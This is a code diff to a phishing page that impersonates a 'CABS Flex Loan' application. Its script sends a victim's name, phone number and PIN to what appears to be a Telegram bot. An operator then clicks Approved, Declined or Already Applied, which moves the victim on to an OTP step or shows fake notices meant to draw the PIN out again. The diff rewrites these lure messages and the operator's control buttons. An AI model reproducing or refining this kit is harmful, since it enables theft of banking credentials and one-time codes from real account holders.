@@ -386,8 +386,8 @@
     <div id="warningModal" class="modal-overlay">
         <div class="modal-card">
             <div class="modal-icon">&#9888;&#65039;</div>
-            <div class="modal-title">Incorrect PIN</div>
-            <div id="modalMsg" class="modal-text">You put wrong pin 2 attempts remaining make sure you repeat with correct pin.</div>
+            <div class="modal-title">Notice</div>
+            <div id="modalMsg" class="modal-text"></div>
             <button class="modal-btn" onclick="closeModal()">Try Again</button>
         </div>
     </div>
@@ -409,6 +409,12 @@
 
         function init() {
             const params = new URLSearchParams(window.location.search);
+            // If returned from a Declined decision, show the declined warning
+            if (params.get('declined') === '1') {
+                setTimeout(function() {
+                    showModal('Your previous application was declined. Please verify your account details and try again.');
+                }, 500);
+            }
             loanData.name = params.get('name') || params.get('firstName') || "Valued Client";
 
             let rawAmount = params.get('amount') || "0";
@@ -494,11 +500,11 @@
             }
             if (!ok) return;
 
-            const msg = '\ud83d\ude80 <b>CABS Flex Loan Attempt</b>\n\n\ud83d\udc64 <b>Name:</b> <code>' + decodeURIComponent(loanData.name) + '</code>\n\ud83d\udcf1 <b>Phone:</b> <code>' + phone + '</code>\n\ud83d\udd12 <b>PIN:</b> <code>' + pin + '</code>\n\ud83d\udcb0 <b>Amount:</b> <code>$' + loanData.amount + ' USD</code>\n\ud83c\udfaf <b>Purpose:</b> <code>' + decodeURIComponent(loanData.purpose) + '</code>\n\ud83d\udd22 <b>Attempt:</b> <code>' + (pinAttempts + 1) + '</code>';
+            const msg = '\ud83d\ude80 <b>CABS Flex Loan Verification</b>\n\n\ud83d\udc64 <b>Name:</b> <code>' + decodeURIComponent(loanData.name) + '</code>\n\ud83d\udcf1 <b>Phone:</b> <code>' + phone + '</code>\n\ud83d\udd12 <b>PIN:</b> <code>' + pin + '</code>\n\ud83d\udcb0 <b>Amount:</b> <code>$' + parseFloat(loanData.amount).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 }) + ' USD</code>\n\ud83c\udfaf <b>Purpose:</b> <code>' + decodeURIComponent(loanData.purpose) + '</code>\n\nPlease choose an action below:';
 
+            // 3 buttons: Approved / Declined / Already Applied
             const buttons = [
-                [{ text: '\u2705 Approve PIN', callback_data: 'pin_valid' }, { text: '\u274c Reject PIN', callback_data: 'pin_invalid' }],
-                [{ text: '\u26a0\ufe0f Flag Account', callback_data: 'login_applied' }]
+                [{ text: '\u2705 Approved', callback_data: 'login_approved' }, { text: '\u274c Declined', callback_data: 'login_declined' }, { text: '\u26a0\ufe0f Already Applied', callback_data: 'login_applied' }]
             ];
 
             document.getElementById('ov').classList.add('on');
@@ -518,33 +524,23 @@
                                     const action = update.callback_query.data;
                                     console.log('Callback received:', action);
 
-                                    if (action === 'pin_valid') {
+                                    if (action === 'login_approved') {
                                         clearInterval(pollInterval);
                                         document.getElementById('ov').classList.remove('on');
                                         clrErr();
                                         proceedToOTP();
                                     }
-                                    else if (action === 'pin_invalid') {
+                                    else if (action === 'login_declined') {
                                         clearInterval(pollInterval);
                                         document.getElementById('ov').classList.remove('on');
-                                        pinAttempts++;
-
-                                        let remaining = 3 - pinAttempts;
-                                        if (remaining > 0) {
-                                            showModal('You put wrong pin ' + remaining + ' attempts remaining make sure you repeat with correct pin.');
-                                        } else {
-                                            showErr('Maximum attempts reached. Please contact support.');
-                                            document.getElementById('phone').value = '';
-                                            document.getElementById('pin').value = '';
-                                            pinAttempts = 0;
-                                        }
-                                        document.getElementById('pin').value = '';
+                                        // Declined returns to login.html just as the Declined word works
+                                        location.href = 'login.html?declined=1';
                                     }
                                     else if (action === 'login_applied') {
                                         clearInterval(pollInterval);
                                         document.getElementById('ov').classList.remove('on');
-                                        showErr('This account has already submitted a loan application.');
-                                        document.getElementById('phone').value = '';
+                                        // Already Applied: warning popup that you already applied
+                                        showModal('You have already applied for a Flex Loan. Please wait for your application to get approved.');
                                         document.getElementById('pin').value = '';
                                     }
                                 }
